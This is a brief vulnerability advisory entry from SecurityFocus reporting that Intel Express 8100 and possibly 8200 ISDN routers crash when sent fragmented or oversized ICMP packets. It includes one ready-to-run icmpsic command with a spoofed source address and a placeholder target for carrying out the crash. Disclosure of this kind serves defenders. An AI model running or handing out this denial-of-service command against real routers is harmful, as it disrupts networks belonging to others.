source: https://www.securityfocus.com/bid/1228/info

The Intel Express 8100 and possibly 8200 ISDN routers can be remotely crashed by sending fragmented or oversized ICMP packets. 

Using libnet and isic-0.05:
icmpsic -s 127.0.0.1,23 -d <target.router.ip.address> -F 100